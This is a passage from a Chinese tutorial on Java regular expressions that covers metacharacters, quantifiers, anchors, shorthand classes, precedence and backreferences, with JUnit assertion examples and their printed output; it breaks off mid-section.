<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkMatches(<span class="string">"abc"</span>, <span class="string">"abc"</span>);</span><br></pre></td></tr></table></figure>

<p>如果要匹配一个确定的字符串，非常简单，如例 1 所示。</p>
<p>如果你不确定要匹配的字符串，希望有多个选择，怎么办？</p>
<p>答案是：使用元字符<code>|</code> ，它的含义是或。</p>
<p><strong>例 匹配多个可选的字符串</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试正则表达式字符：|</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"yes|no"</span>, <span class="string">"yes"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"yes|no"</span>, <span class="string">"no"</span>));</span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"yes|no"</span>, <span class="string">"right"</span>));</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yes	matches： yes|no</span><br><span class="line">no	matches： yes|no</span><br><span class="line">right	not matches： yes|no</span><br></pre></td></tr></table></figure>

<h3 id="分组"><a href="#分组" class="headerlink" title="分组 - ()"></a>分组 - ()</h3><p>如果你希望表达式由多个子表达式组成，你可以使用 <code>()</code>。</p>
<p><strong>例 匹配组合字符串</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Assert.assertTrue(checkMatches(<span class="string">"(play|end)(ing|ed)"</span>, <span class="string">"ended"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"(play|end)(ing|ed)"</span>, <span class="string">"ending"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"(play|end)(ing|ed)"</span>, <span class="string">"playing"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"(play|end)(ing|ed)"</span>, <span class="string">"played"</span>));</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ended	matches： (play|end)(ing|ed)</span><br><span class="line">ending	matches： (play|end)(ing|ed)</span><br><span class="line">playing	matches： (play|end)(ing|ed)</span><br><span class="line">played	matches： (play|end)(ing|ed)</span><br></pre></td></tr></table></figure>

<h3 id="指定单字符有效范围"><a href="#指定单字符有效范围" class="headerlink" title="指定单字符有效范围 - []"></a>指定单字符有效范围 - []</h3><p>前面展示了如何匹配字符串，但是很多时候你需要精确的匹配一个字符，这时可以使用<code>[]</code> 。</p>
<p><strong>例 字符在指定范围</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试正则表达式字符：[]</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[abc]"</span>, <span class="string">"b"</span>));  <span class="comment">// 字符只能是a、b、c</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[a-z]"</span>, <span class="string">"m"</span>)); <span class="comment">// 字符只能是a - z</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[A-Z]"</span>, <span class="string">"O"</span>)); <span class="comment">// 字符只能是A - Z</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[a-zA-Z]"</span>, <span class="string">"K"</span>)); <span class="comment">// 字符只能是a - z和A - Z</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[a-zA-Z]"</span>, <span class="string">"k"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[0-9]"</span>, <span class="string">"5"</span>)); <span class="comment">// 字符只能是0 - 9</span></span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b	matches： [abc]</span><br><span class="line">m	matches： [a-z]</span><br><span class="line">O	matches： [A-Z]</span><br><span class="line">K	matches： [a-zA-Z]</span><br><span class="line">k	matches： [a-zA-Z]</span><br><span class="line">5	matches： [0-9]</span><br></pre></td></tr></table></figure>

<h3 id="指定单字符无效范围"><a href="#指定单字符无效范围" class="headerlink" title="指定单字符无效范围 - [^]"></a>指定单字符无效范围 - [^]</h3><p><strong>例 字符不能在指定范围</strong></p>
<p>如果需要匹配一个字符的逆操作，即字符不能在指定范围，可以使用<code>[^]</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试正则表达式字符：[^]</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^abc]"</span>, <span class="string">"b"</span>)); <span class="comment">// 字符不能是a、b、c</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^a-z]"</span>, <span class="string">"m"</span>)); <span class="comment">// 字符不能是a - z</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^A-Z]"</span>, <span class="string">"O"</span>)); <span class="comment">// 字符不能是A - Z</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^a-zA-Z]"</span>, <span class="string">"K"</span>)); <span class="comment">// 字符不能是a - z和A - Z</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^a-zA-Z]"</span>, <span class="string">"k"</span>));</span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^0-9]"</span>, <span class="string">"5"</span>)); <span class="comment">// 字符不能是0 - 9</span></span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b	not matches： [^abc]</span><br><span class="line">m	not matches： [^a-z]</span><br><span class="line">O	not matches： [^A-Z]</span><br><span class="line">K	not matches： [^a-zA-Z]</span><br><span class="line">k	not matches： [^a-zA-Z]</span><br><span class="line">5	not matches： [^0-9]</span><br></pre></td></tr></table></figure>

<h3 id="限制字符数量"><a href="#限制字符数量" class="headerlink" title="限制字符数量 - {}"></a>限制字符数量 - {}</h3><p>如果想要控制字符出现的次数，可以使用<code>{}</code>。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>{n}</code></td>
<td>n 是一个非负整数。匹配确定的 n 次。</td>
</tr>
<tr>
<td><code>{n,}</code></td>
<td>n 是一个非负整数。至少匹配 n 次。</td>
</tr>
<tr>
<td><code>{n,m}</code></td>
<td>m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>
</tr>
</tbody></table>
<p><strong>例 限制字符出现次数</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#123;n&#125;: n 是一个非负整数。匹配确定的 n 次。</span></span><br><span class="line">checkMatches(<span class="string">"ap&#123;1&#125;"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1&#125;"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1&#125;"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1&#125;"</span>, <span class="string">"apppppppppp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;n,&#125;: n 是一个非负整数。至少匹配 n 次。</span></span><br><span class="line">checkMatches(<span class="string">"ap&#123;1,&#125;"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1,&#125;"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1,&#125;"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;1,&#125;"</span>, <span class="string">"apppppppppp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;n,m&#125;: m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。</span></span><br><span class="line">checkMatches(<span class="string">"ap&#123;2,5&#125;"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;2,5&#125;"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;2,5&#125;"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap&#123;2,5&#125;"</span>, <span class="string">"apppppppppp"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a	not matches： ap&#123;1&#125;</span><br><span class="line">ap	matches： ap&#123;1&#125;</span><br><span class="line">app	not matches： ap&#123;1&#125;</span><br><span class="line">apppppppppp	not matches： ap&#123;1&#125;</span><br><span class="line">a	not matches： ap&#123;1,&#125;</span><br><span class="line">ap	matches： ap&#123;1,&#125;</span><br><span class="line">app	matches： ap&#123;1,&#125;</span><br><span class="line">apppppppppp	matches： ap&#123;1,&#125;</span><br><span class="line">a	not matches： ap&#123;2,5&#125;</span><br><span class="line">ap	not matches： ap&#123;2,5&#125;</span><br><span class="line">app	matches： ap&#123;2,5&#125;</span><br><span class="line">apppppppppp	not matches： ap&#123;2,5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符 - /"></a>转义字符 - /</h3><p>如果想要查找元字符本身，你需要使用转义符，使得正则引擎将其视作一个普通字符，而不是一个元字符去处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 的转义字符：\*</span><br><span class="line">+ 的转义字符：\+</span><br><span class="line">? 的转义字符：\?</span><br><span class="line">^ 的转义字符：\^</span><br><span class="line">$ 的转义字符：\$</span><br><span class="line">. 的转义字符：\.</span><br></pre></td></tr></table></figure>

<p>如果是转义符<code>\</code>本身，你也需要使用<code>\\</code> 。</p>
<h3 id="指定表达式字符串的开始和结尾-、"><a href="#指定表达式字符串的开始和结尾-、" class="headerlink" title="指定表达式字符串的开始和结尾 - ^、$"></a>指定表达式字符串的开始和结尾 - ^、$</h3><p>如果希望匹配的字符串必须以特定字符串开头，可以使用<code>^</code> 。</p>
<p>注：请特别留意，这里的<code>^</code> 一定要和 <code>[^]</code> 中的 “^” 区分。</p>
<p><strong>例 限制字符串头部</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Assert.assertTrue(checkMatches(<span class="string">"^app[a-z]&#123;0,&#125;"</span>, <span class="string">"apple"</span>)); <span class="comment">// 字符串必须以app开头</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"^app[a-z]&#123;0,&#125;"</span>, <span class="string">"aplause"</span>));</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apple	matches： ^app[a-z]&#123;0,&#125;</span><br><span class="line">aplause	not matches： ^app[a-z]&#123;0,&#125;</span><br></pre></td></tr></table></figure>

<p>如果希望匹配的字符串必须以特定字符串开头，可以使用<code>$</code> 。</p>
<p><strong>例 限制字符串尾部</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Assert.assertTrue(checkMatches(<span class="string">"[a-z]&#123;0,&#125;ing$"</span>, <span class="string">"playing"</span>)); <span class="comment">// 字符串必须以ing结尾</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[a-z]&#123;0,&#125;ing$"</span>, <span class="string">"long"</span>));</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">playing	matches： [a-z]&#123;0,&#125;ing$</span><br><span class="line">long	not matches： [a-z]&#123;0,&#125;ing$</span><br></pre></td></tr></table></figure>

<h2 id="等价字符"><a href="#等价字符" class="headerlink" title="等价字符"></a>等价字符</h2><p>等价字符，顾名思义，就是对于基本元字符表达的一种简化（等价字符的功能都可以通过基本元字符来实现）。</p>
<p>在没有掌握基本元字符之前，可以先不用理会，因为很容易把人绕晕。</p>
<p>等价字符的好处在于简化了基本元字符的写法。</p>
<h3 id="表示某一类型字符的等价字符"><a href="#表示某一类型字符的等价字符" class="headerlink" title="表示某一类型字符的等价字符"></a>表示某一类型字符的等价字符</h3><p>下表中的等价字符都表示某一类型的字符。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>.</code></strong></td>
<td>匹配除“\n”之外的任何单个字符。</td>
</tr>
<tr>
<td><strong><code>\d</code></strong></td>
<td>匹配一个数字字符。等价于[0-9]。</td>
</tr>
<tr>
<td><strong><code>\D</code></strong></td>
<td>匹配一个非数字字符。等价于[^0-9]。</td>
</tr>
<tr>
<td><strong><code>\w</code></strong></td>
<td>匹配包括下划线的任何单词字符。类似但不等价于“[A-Za-z0-9_]”，这里的单词字符指的是 Unicode 字符集。</td>
</tr>
<tr>
<td><strong><code>\W</code></strong></td>
<td>匹配任何非单词字符。</td>
</tr>
<tr>
<td><strong><code>\s</code></strong></td>
<td>匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td>
</tr>
<tr>
<td><strong><code>\S</code></strong></td>
<td>匹配任何可见字符。等价于[ \f\n\r\t\v]。</td>
</tr>
</tbody></table>
<p><strong>案例 基本等价字符的用法</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 匹配除“\n”之外的任何单个字符</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">".&#123;1,&#125;"</span>, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">".&#123;1,&#125;"</span>, <span class="string">"~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\"</span>));</span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"."</span>, <span class="string">"\n"</span>));</span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"[^\n]"</span>, <span class="string">"\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配一个数字字符。等价于[0-9]</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"\\d&#123;1,&#125;"</span>, <span class="string">"0123456789"</span>));</span><br><span class="line"><span class="comment">// 匹配一个非数字字符。等价于[^0-9]</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"\\D&#123;1,&#125;"</span>, <span class="string">"0123456789"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配包括下划线的任何单词字符。类似但不等价于“[A-Za-z0-9_]”，这里的单词字符指的是Unicode字符集</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"\\w&#123;1,&#125;"</span>, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"</span>));</span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"\\w&#123;1,&#125;"</span>, <span class="string">"~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\"</span>));</span><br><span class="line"><span class="comment">// 匹配任何非单词字符</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"\\W&#123;1,&#125;"</span>, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"</span>));</span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"\\W&#123;1,&#125;"</span>, <span class="string">"~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]</span></span><br><span class="line">Assert.assertTrue(checkMatches(<span class="string">"\\s&#123;1,&#125;"</span>, <span class="string">" \f\r\n\t"</span>));</span><br><span class="line"><span class="comment">// 匹配任何可见字符。等价于[^ \f\n\r\t\v]</span></span><br><span class="line">Assert.assertFalse(checkMatches(<span class="string">"\\S&#123;1,&#125;"</span>, <span class="string">" \f\r\n\t"</span>));</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_	matches： .&#123;1,&#125;</span><br><span class="line">~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\	matches： .&#123;1,&#125;</span><br><span class="line">\n	not matches： .</span><br><span class="line">\n	not matches： [^\n]</span><br><span class="line">0123456789	matches： \\d&#123;1,&#125;</span><br><span class="line">0123456789	not matches： \\D&#123;1,&#125;</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_	matches： \\w&#123;1,&#125;</span><br><span class="line">~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\	not matches： \\w&#123;1,&#125;</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_	not matches： \\W&#123;1,&#125;</span><br><span class="line">~!@#$%^&amp;*()+`-=[]&#123;&#125;;:&lt;&gt;,./?|\\	matches： \\W&#123;1,&#125;</span><br><span class="line"> \f\r\n\t	matches： \\s&#123;1,&#125;</span><br><span class="line"> \f\r\n\t	not matches： \\S&#123;1,&#125;</span><br></pre></td></tr></table></figure>

<h3 id="限制字符数量的等价字符"><a href="#限制字符数量的等价字符" class="headerlink" title="限制字符数量的等价字符"></a>限制字符数量的等价字符</h3><p>在基本元字符章节中，已经介绍了限制字符数量的基本元字符 - <code>{}</code> 。</p>
<p>此外，还有 <code>*</code>、<code>+</code>、<code>?</code> 这个三个为了简化写法而出现的等价字符，我们来认识一下。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>*</code></td>
<td>匹配前面的子表达式零次或多次。等价于{0,}。</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的子表达式一次或多次。等价于{1,}。</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前面的子表达式零次或一次。等价于 {0,1}。</td>
</tr>
</tbody></table>
<p><strong>案例 限制字符数量的等价字符</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// *: 匹配前面的子表达式零次或多次。* 等价于&#123;0,&#125;。</span></span><br><span class="line">checkMatches(<span class="string">"ap*"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap*"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap*"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap*"</span>, <span class="string">"apppppppppp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// +: 匹配前面的子表达式一次或多次。+ 等价于 &#123;1,&#125;。</span></span><br><span class="line">checkMatches(<span class="string">"ap+"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap+"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap+"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap+"</span>, <span class="string">"apppppppppp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?: 匹配前面的子表达式零次或一次。? 等价于 &#123;0,1&#125;。</span></span><br><span class="line">checkMatches(<span class="string">"ap?"</span>, <span class="string">"a"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap?"</span>, <span class="string">"ap"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap?"</span>, <span class="string">"app"</span>);</span><br><span class="line">checkMatches(<span class="string">"ap?"</span>, <span class="string">"apppppppppp"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a	matches： ap*</span><br><span class="line">ap	matches： ap*</span><br><span class="line">app	matches： ap*</span><br><span class="line">apppppppppp	matches： ap*</span><br><span class="line">a	not matches： ap+</span><br><span class="line">ap	matches： ap+</span><br><span class="line">app	matches： ap+</span><br><span class="line">apppppppppp	matches： ap+</span><br><span class="line">a	matches： ap?</span><br><span class="line">ap	matches： ap?</span><br><span class="line">app	not matches： ap?</span><br><span class="line">apppppppppp	not matches： ap?</span><br></pre></td></tr></table></figure>

<h2 id="元字符优先级顺序"><a href="#元字符优先级顺序" class="headerlink" title="元字符优先级顺序"></a>元字符优先级顺序</h2><p>正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。</p>
<p>下表从最高到最低说明了各种正则表达式运算符的优先级顺序：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>\</td>
<td>转义符</td>
</tr>
<tr>
<td>(), (?:), (?=), []</td>
<td>括号和中括号</td>
</tr>
<tr>
<td>*, +, ?, {n}, {n,}, {n,m}</td>
<td>限定符</td>
</tr>
<tr>
<td>^, $, *任何元字符、任何字符*</td>
<td>定位点和序列</td>
</tr>
<tr>
<td>|</td>
<td>替换</td>
</tr>
</tbody></table>
<p>字符具有高于替换运算符的优先级，使得“m|food”匹配“m”或“food”。若要匹配“mood”或“food”，请使用括号创建子表达式，从而产生“(m|f)ood”。</p>
<h2 id="分组构造"><a href="#分组构造" class="headerlink" title="分组构造"></a>分组构造</h2><p>在基本元字符章节，提到了 <code>()</code> 字符可以用来对表达式分组。实际上分组还有更多复杂的用法。</p>
<p>所谓分组构造，是用来描述正则表达式的子表达式，用于捕获字符串中的子字符串。</p>
<h2 id="捕获与非捕获"><a href="#捕获与非捕获" class="headerlink" title="捕获与非捕获"></a>捕获与非捕获</h2><p>下表为分组构造中的捕获和非捕获分类。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
<th>捕获或非捕获</th>
</tr>
</thead>
<tbody><tr>
<td><code>(exp)</code></td>
<td>匹配的子表达式</td>
<td>捕获</td>
</tr>
<tr>
<td><code>(?&lt;name&gt;exp)</code></td>
<td>命名的反向引用</td>
<td>捕获</td>
</tr>
<tr>
<td><code>(?:exp)</code></td>
<td>非捕获组</td>
<td>非捕获</td>
</tr>
<tr>
<td><code>(?=exp)</code></td>
<td>零宽度正预测先行断言</td>
<td>非捕获</td>
</tr>
<tr>
<td><code>(?!exp)</code></td>
<td>零宽度负预测先行断言</td>
<td>非捕获</td>
</tr>
<tr>
<td><code>(?&lt;=exp)</code></td>
<td>零宽度正回顾后发断言</td>
<td>非捕获</td>
</tr>
<tr>
<td><code>(?&lt;!exp)</code></td>
<td>零宽度负回顾后发断言</td>
<td>非捕获</td>
</tr>
</tbody></table>
<p>注：Java 正则引擎不支持平衡组。</p>
<h2 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h2><h3 id="带编号的反向引用"><a href="#带编号的反向引用" class="headerlink" title="带编号的反向引用"></a>带编号的反向引用</h3><p>带编号的反向引用使用以下语法：<code>\number</code></p>
<p>其中<em>number</em> 是正则表达式中捕获组的序号位置。 例如，\4 匹配第四个捕获组的内容。 如果正则表达式模式中未定义<em>number</em>，则将发生分析错误</p>
<p><strong>例 匹配重复的单词和紧随每个重复的单词的单词(不命名子表达式)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (\w+)\s\1\W(\w+) 匹配重复的单词和紧随每个重复的单词的单词</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(\\w+)\\s\\1\\W(\\w+)"</span>,</span><br><span class="line">		<span class="string">"He said that that was the the correct answer."</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regex = (\w+)\s\1\W(\w+), content: He said that that was the the correct answer.</span><br><span class="line">[1th] start: 8, end: 21, group: that that was</span><br><span class="line">[2th] start: 22, end: 37, group: the the correct</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<p>(\w+): 匹配一个或多个单词字符。<br>\s: 与空白字符匹配。<br>\1: 匹配第一个组，即(\w+)。<br>\W: 匹配包括空格和标点符号的一个非单词字符。 这样可以防止正则表达式模式匹配从第一个捕获组的单词开头的单词。</p>
<h3 id="命名的反向引用"><a href="#命名的反向引用" class="headerlink" title="命名的反向引用"></a>命名的反向引用</h3><p>命名后向引用通过使用下面的语法进行定义：<code>\k&lt;name &gt;</code></p>
<p><strong>例 匹配重复的单词和紧随每个重复的单词的单词(命名子表达式)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (?&lt;duplicateWord&gt;\w+)\s\k&lt;duplicateWord&gt;\W(?&lt;nextWord&gt;\w+) 匹配重复的单词和紧随每个重复的单词的单词</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?&lt;duplicateWord&gt;\\w+)\\s\\k&lt;duplicateWord&gt;\\W(?&lt;nextWord&gt;\\w+)"</span>,</span><br><span class="line">		<span class="string">"He said that that was the the correct answer."</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regex = (?&lt;duplicateWord&gt;\w+)\s\k&lt;duplicateWord&gt;\W(?&lt;nextWord&gt;\w+), content: He said that that was the the correct answer.</span><br><span class="line">[1th] start: 8, end: 21, group: that that was</span><br><span class="line">[2th] start: 22, end: 37, group: the the correct</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
